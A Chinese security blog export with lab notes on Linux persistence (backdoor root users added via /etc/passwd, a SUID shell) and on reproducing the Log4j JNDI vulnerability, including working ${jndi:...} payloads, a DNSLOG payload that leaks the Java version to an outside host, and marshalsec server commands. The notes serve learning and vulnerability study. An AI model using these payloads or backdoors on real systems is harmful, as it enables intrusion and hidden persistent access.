<p>这样子就可以进程的输出就会实时更新在1.out文件里了</p>
<h2 id="2-py"><a href="#2-py" class="headerlink" title="2.py"></a>2.py</h2><p>然后来看第二个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br></pre></td></tr></table></figure>

<p>我在代码里留了一个报错，使用之前的命令</p>
<ul>
<li>python <strong>-u</strong> 2.py  &gt; 2.out &amp;</li>
</ul>
<p>可以看到程序在运行几秒后就报错了</p>
<p><img src="image-20220423131458093.png" alt="image-20220423131458093"></p>
<p>如果想把报错信息也重定向到文件中，就需要这样子写命令</p>
<ul>
<li><p>python -u 2.py  &gt; 2.out <strong>2&gt;&amp;1</strong> &amp; </p>
<p>2&gt;&amp;1，意思时将标准错误重定向至标准输出</p>
</li>
</ul>
<p><img src="image-20220423131720672.png" alt="image-20220423131720672"></p>
<ul>
<li>python -u 2.py &gt;&gt; 2.out 2&gt;&amp;1 &amp;  </li>
</ul>
<p>如果使用&gt;&gt;就会追加新的输出到文件中</p>
<p><img src="image-20220423131948764.png" alt="image-20220423131948764"></p>
]]></content>
  </entry>
  <entry>
    <title>linux权限维持</title>
    <url>/2021/06/08/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-This-is-Y/</url>
    <content><![CDATA[<p>以刚刚拿下的DC-5靶机为例，测试一下各种linux权限维持的方法</p>
<p>方法都来自：<a class="link" href="https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/">https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/<i class="fas fa-external-link-alt"></i></a></p>
<p>以此记录一下</p>
<p><img src="mbGCWWC.png" alt="mbGCWWC"></p>
<h2 id="添加超级用户："><a href="#添加超级用户：" class="headerlink" title="添加超级用户："></a>添加超级用户：</h2><p>添加</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line">useradd -p `openssl passwd 123456` guest</span><br><span class="line">useradd -p &quot;$(openssl passwd 123456)&quot; guest</span><br><span class="line">useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</span><br></pre></td></tr></table></figure>
<p>设置root权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</span><br><span class="line">echo &#x27;guest:123456&#x27;|chpasswd</span><br></pre></td></tr></table></figure>
<p>实际测试中发现添加用户后，passwd文件中就存在那一条数据了，再写的话，修改不了权限，所以我这里先添加数据到passwd中，再添加用户（或者修改密码）</p>
<p><img src="image-20210608171347277.png" alt="image-20210608171347277"></p>
<p>除此之外，还有一个方式添加新用户，<br>先对密码就行加密<br>openssl passwd -1 -salt admin admin<br>-1 的意思是使用md5加密算法<br>-salt 自动插入一个随机数作为文件内容加密，默认选项 加点盐：<br>得到密文后，拼接为一条消息，写入到passwd文件中，这样子就不需要chpasswd了<br>    admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash<br>    echo ‘admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash’ &gt; /etc/passwd</p>
<p>有些时候添加不成功是因为用户策略可以适当加强密码强度<br>有些也会限制root权限用户远程登录</p>
<h2 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h2><p>提权后，cp /bin/bash /.test<br>chmod 4755 /.test<br>之后以普通用户运行<br>/.test -p</p>
<p><img src="image-20210608172859611.png" alt="image-20210608172859611"><br>euid:effective user ID:有效用户ID,指进程执行时对文件的访问权限</p>
<p>后面的由于环境不合适，就没测了。</p>
]]></content>
  </entry>
  <entry>
    <title>log4j</title>
    <url>/2021/12/20/log4j-This-is-Y/</url>
    <content><![CDATA[<p>参考：<br><a class="link" href="https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA">https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h3><p>我试过jdk1.8.0_202，8.0.292.hs-adpt。最后是用的<strong>jdk1.8.0_102</strong>才成功的,具体原因还不知道。</p>
<p><img src="image-20211220104933657.png" alt="image-20211220104933657"></p>
<p>因为使用git bash安装的sdkman改变的java版本貌似只能改变gitbash内的java，不过找到了它下载的路径，于是自己写了一个小脚本来修改java环境变量，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">java1 = <span class="string">r&quot;C:\Program Files\Java&quot;</span></span><br><span class="line">java2 = <span class="string">r&quot;C:\Users\This_is_Y\.sdkman\candidates\java&quot;</span></span><br><span class="line">javapath = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_javapath</span>(<span class="params">javafold</span>):</span></span><br><span class="line">    <span class="keyword">global</span> javapath</span><br><span class="line">    dbtype_list = os.listdir(javafold)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dbtype_list:</span><br><span class="line">        java_path = javafold+<span class="string">&quot;\\&quot;</span>+i</span><br><span class="line">        javapath.append(java_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changgepath</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">global</span> javapath</span><br><span class="line">    java = javapath[num-<span class="number">1</span>]</span><br><span class="line">    command =<span class="string">&quot;setx JAVA_HOME \&quot;%s\&quot; &quot;</span>%java</span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    t = os.system(command)\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_javapath(java1)</span><br><span class="line">get_javapath(java2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(javapath)):</span><br><span class="line">    <span class="built_in">print</span>(i+<span class="number">1</span>,javapath[i])</span><br><span class="line"></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>))</span><br><span class="line">changgepath(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=================新打开一个命令窗口执行以下命令查看是否更换成功=================&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cmd /c echo %JAVA_HOME%&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;java -version&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;javac -version&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>idea，新建一个maven项目</p>
<h4 id="添加log4j"><a href="#添加log4j" class="headerlink" title="添加log4j"></a>添加log4j</h4><p>然后文件-项目结构,模块-依赖，添加库，把log4j-api-2.14.1和log4j-core-2.14.1添加进去。一般搞过java这些东西的，电脑里都会有，用everything搜一下就有了，实在没有的话，去<a class="link" href="https://archive.apache.org/dist/logging/log4j/2.14.1/%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E5%B0%B1%E5%A5%BD%E4%BA%86">https://archive.apache.org/dist/logging/log4j/2.14.1/下载一个就好了<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20211220103949109.png" alt="image-20211220103949109"><img src="image-20211220104030015.png" alt="image-20211220104030015"></p>
<h4 id="main-入口类"><a href="#main-入口类" class="headerlink" title="main 入口类"></a>main 入口类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="JNDI-Injection-Exploit"><a href="#JNDI-Injection-Exploit" class="headerlink" title="JNDI-Injection-Exploit"></a>JNDI-Injection-Exploit</h4><p><a class="link" href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">https://github.com/welk1n/JNDI-Injection-Exploit/releases<i class="fas fa-external-link-alt"></i></a><br>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc” -A “127.0.0.1”</p>
<ul>
<li><p>参数说明</p>
<ul>
<li><p>-C ：远程 class 文件中要执行的命令。</p>
</li>
<li><p>-A ：服务器地址，可以是 ip 或者域名</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>注意事项</p>
<ul>
<li>要确保 1099,1389，8180 端口可用，或下载源码在 run.ServerStart 类 26~28 行更改默认端口，再打包成 jar 包运行</li>
<li>命令会作为参数传入 Runtime.getRuntime().exec()，所以需要确保命令传入 exec() 方法可执行。</li>
<li>bash 等可在 shell 直接执行的相关命令需要加双引号，比如说 java -jar JNDI.jar -C “bash -c …”</li>
</ul>
</li>
</ul>
<p><img src="image-20211220105325704.png" alt="image-20211220105325704"><br>因为使用的jdkjdk1.8.0_102，选择rmi://127.0.0.1:1099/pu7fje,ldap://127.0.0.1:1389/pu7fje这两个.<br>payload:<br><strong>${jndi:rmi://127.0.0.1:1099/pu7fje}</strong><br><strong>${jndi:ldap://127.0.0.1:1389/pu7fje}</strong><br>然后直接右键运行就可以了<br><img src="image-20211220105719454.png" alt="image-20211220105719454"><br>然后就是<br><img src="image-20211220105823608.png" alt="image-20211220105823608"></p>
<h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h4><p>利用<a class="link" href="http://ceye.io/">ceye<i class="fas fa-external-link-alt"></i></a>或者<a class="link" href="http://www.dnslog.cn/">dnglo<i class="fas fa-external-link-alt"></i></a>或者其他平台，获取一个域名<br>payload:<br><strong>${jndi:rmi://log4j.xxxxxx.dnslog.cn/exp}</strong><br><strong>${jndi:rmi://log4j.xxxxxx.ceye.io/exp}</strong></p>
<p><img src="image-20211220111302956.png" alt="image-20211220111302956"></p>
<p>结果</p>
<p><img src="image-20211220111355708.png" alt="image-20211220111355708"></p>
<p><img src="image-20211220111421037.png" alt="image-20211220111421037"></p>
<p>值得注意的是，虽然在域名后面，要加点东西（随便什么都可以），直接甩一个链接上来的话，是接收不到回显的。</p>
<p>这种方式也可以获取一些数据<br>payload:<br><strong>${jndi:ldap://${sys:java.version}.collaborator.com}</strong><br>可以获取的数据如图：</p>
<p><img src="image-20211220112122398.png" alt="image-20211220112122398"></p>
<p><img src="image-20211220113241376.png" alt="image-20211220113241376"></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h4 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h4><p>本次漏洞触发相当简单，只要使用了org/apache/logging/log4j/spi/AbstractLogger.java log进行记录，且log等级为可记录等级即可触发。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Logger logger &#x3D; LogManager.getLogger();</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">  logger.error(&quot;$&#123;jndi:ldap:&#x2F;&#x2F;ip:1389&#x2F;#Exploit&#125;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。因此也可以使用如下方式触发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">logger.error(&quot;8881273asdf$&#123;jndi:ldap:&#x2F;&#x2F;ip:1389&#x2F;#Exploit&#125;aksdjfhuip8efas&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="入口函数"><a href="#入口函数" class="headerlink" title="入口函数"></a>入口函数</h4><p>本次漏洞的入口函数为logIfEnabled，然而如果使用了AbstractLogger.java中的debug、info、warn、error、fatal等都会触发到该函数<br>这次复现使用的就是error</p>
<p><img src="image-20211220152514594.png" alt="image-20211220152514594"></p>
<p><img src="image-20211220152521989.png" alt="image-20211220152521989"></p>
<h4 id="核心原理之匹配"><a href="#核心原理之匹配" class="headerlink" title="核心原理之匹配"></a>核心原理之匹配</h4><p>该漏洞的核心原理为，在正常的log处理过程中对 ${ 这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制。<br>检测的地方在\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\pattern\MessagePatternConverter.class这个类里面，代码运行到这里的时候，workingBuilder的值是15:12:56.541 [main] ERROR log4j - ${jndi:rmi://127.0.0.1:1099/pu7fje}</p>
<p><img src="image-20211220152809339.png" alt="image-20211220152809339"></p>
<p>检测到${连在一起后，进入log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\lookup\StrSubstitutor.class </p>
]]></content>
  </entry>
  <entry>
    <title>log4j反序列化分析笔记</title>
    <url>/2023/12/08/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>idea直接新建一个项目</p>
<ul>
<li>ubuntu 22.04</li>
<li>java version “1.8.0_102”</li>
<li>marshalsec-0.0.3-SNAPSHOT-all.jar （sha1 22f311752a1c6ce1102bcb199458c8d10118ae6e）</li>
<li>python3x</li>
</ul>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = (Logger)  LogManager.getLogger(Main.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://192.168.146.213:9999/Calc&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Calc.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;gnome-calculator&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译Calc.java为Calc.class，然后本地使用python起一个web服务（sudo python3 -m http.server 8888），之后使用marshalsec起一个jndi服务（java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a class="link" href="http://0.0.0.0:8888/#Calc&quot;">http://0.0.0.0:8888/#Calc&quot;<i class="fas fa-external-link-alt"></i></a> 9999）</p>
<p>运行结果：</p>
<p><img src="image-20240322212143201.png" alt="image-20240322212143201"></p>
<p>参考：</p>
<p><a class="link" href="https://blog.51cto.com/u_16117621/6292981">https://blog.51cto.com/u_16117621/6292981<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>msf启动显示 Nodatabase support：could not connect  to server connection refused</title>
    <url>/2020/02/19/msf%E5%90%AF%E5%8A%A8%E6%98%BE%E7%A4%BA%20Nodatabase%20support%EF%BC%9Acould%20not%20connect%20%20to%20server%20connection%20refused-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12331180.html">源地址：https://www.cnblogs.com/This-is-Y/p/12331180.html<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20200219140526686-766021379.png" alt width="716" height="155">

<p> </p>
<p> 如图，在启动msf时，一般都会自动连接上数据库，今天偶然出现这种情况。解决办法大致如下：</p>
<p>exit退出当前msf</p>
<p>可以先用msfdb start</p>
<p>检查一下是否启动：netstat -pandu | grep 5432</p>
<p>没有启动的话，用service postgresql start来连接</p>
<img src="1503868-20200219143027800-1343091653.png" alt>

<p> 在msf中可以输入db_(tab)来查看可用的数据库命令</p>
<img src="1503868-20200219143355807-535893405.png" alt>

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>mysql 的information_schame</title>
    <url>/2020/08/16/mysql%20%E7%9A%84information_schame-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13492709.html">源地址：https://www.cnblogs.com/This-is-Y/p/13492709.html<i class="fas fa-external-link-alt"></i></a></p>
<p>借用知乎的某个回答：<a class="link" href="https://zhuanlan.zhihu.com/p/103047571">https://zhuanlan.zhihu.com/p/103047571<i class="fas fa-external-link-alt"></i></a></p>
<p>解释了database、schame、tables、column、row、dba、user的关系</p>
<img src="data:image/png;base64,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